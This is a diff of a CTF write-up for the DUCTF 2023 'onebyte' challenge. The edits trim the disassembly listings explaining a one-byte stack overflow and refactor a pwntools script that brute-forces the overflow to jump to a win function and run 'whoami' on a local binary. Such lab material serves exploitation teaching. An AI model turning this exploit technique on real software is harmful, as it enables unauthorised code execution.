@@ -4,7 +4,7 @@ title: DUCTF 2023 writeup for 'onebyte'
 date: 2023-09-19
 ---
 
-This writeup will explain how to exploit the "onebyte" binary.
+This writeup will explain how to exploit the "onebyte" CTF challenge.
 
 > *Here's a one byte buffer overflow!*
 
@@ -75,10 +75,10 @@ Let's trim it down to the parts that matter for the exploit:
 Now, let's walk through the behavior of the stack. Start with the function prologue.
 
 ```
-   0x00001239 <+11>:	mov    ebp,esp
-   0x0000123b <+13>:	push   ebx
-   0x0000123c <+14>:	push   ecx
-   0x0000123d <+15>:	sub    esp,0x10
+<+11>:	mov    ebp,esp
+<+13>:	push   ebx
+<+14>:	push   ecx
+<+15>:	sub    esp,0x10
 ```
 
 First, the base pointer *EBP* is 24 bytes below the stack pointer *ESP*. The lowest 16 bytes are allocated for local variables. Based on the C code, we can infer that this space is reserved only for the 16-byte buffer, *buf*. We can also infer that the original value of ECX is located at *EBP*-8.
@@ -86,10 +86,10 @@ First, the base pointer *EBP* is 24 bytes below the stack pointer *ESP*. The low
 Next, at *main*+82 and 86, the 16-byte variable *buf* is set as the second parameter to *read*. 
 
 ```
-   0x00001280 <+82>:	lea    eax,[ebp-0x18]
-   0x00001283 <+85>:	push   eax
-   ...
-   0x00001286 <+88>:	call   0x1050 <read@plt>
+<+82>:	lea    eax,[ebp-0x18]
+<+85>:	push   eax
+...
+<+88>:	call   0x1050 <read@plt>
 ```
 
 So, *buf* is at *EBP*-0x18, or *EBP*-24. This aligns with our analysis of the prologue.
@@ -97,8 +97,8 @@ So, *buf* is at *EBP*-0x18, or *EBP*-24. This aligns with our analysis of the pr
 At *main*+101 and 104, ECX is set to its original value, at *EBP*-8. 
 
 ```
-   0x00001293 <+101>:	lea    esp,[ebp-0x8]
-   0x00001296 <+104>:	pop    ecx
+<+101>:	lea    esp,[ebp-0x8]
+<+104>:	pop    ecx
 ```
 
 Note that this is lined up against the end of the 16-byte *buf*. Also recall that *EPB*-8 is exactly where the one-byte overflow would occur.
@@ -106,8 +106,8 @@ Note that this is lined up against the end of the 16-byte *buf*. Also recall tha
 Finally, the return address is determined in the last two lines:
 
 ```
-   0x00001299 <+107>:	lea    esp,[ecx-0x4]
-   0x0000129c <+110>:	ret
+<+107>:	lea    esp,[ecx-0x4]
+<+110>:	ret
 ```
 
 Observe that the stack pointer is set to whatever data exists at *ECX*-4. When the function returns at *main*+110, the program will try to jump to that location and execute any assembly there. If a function exists there, the application will execute it.
@@ -302,7 +302,7 @@ Here's a working solution:
 ```python
 from pwn import *
 
-def bruteforce(p, command) -> str:
+def send_exploit(p, command) -> str:
     p.recvuntil(b"Free junk: 0x")
     init_address = int(p.recv(8).decode(), 16)
     win_address = init_address + 70
@@ -312,20 +312,25 @@ def bruteforce(p, command) -> str:
     p.sendline(command.encode())
     return p.recvline().decode()
 
-if __name__ == "__main__":
-    while True:
+def brute_force(binary_path, command, match): 
+    flag = None
+    while not flag:
+        p = process(binary_path)
         try:
-            p = process("/home/kali/onebyte", "whoami")
-            flag = bruteforce(p, "whoami")
-            p.close()
-            if "kali" in flag:
-                print(flag)
-                break
+            response = send_exploit(p, command)
+            if match in response:
+                flag = response
         except EOFError:
-            p.close()
-            continue
-        except KeyboardInterrupt:
-            break
+            pass
+        finally:
+            p.close()    
+    return flag
+
+if __name__ == "__main__":
+    try:
+        print(brute_force("/home/kali/onebyte", "whoami", "kali"))
+    except KeyboardInterrupt:
+        pass
 ```
 
 Output:
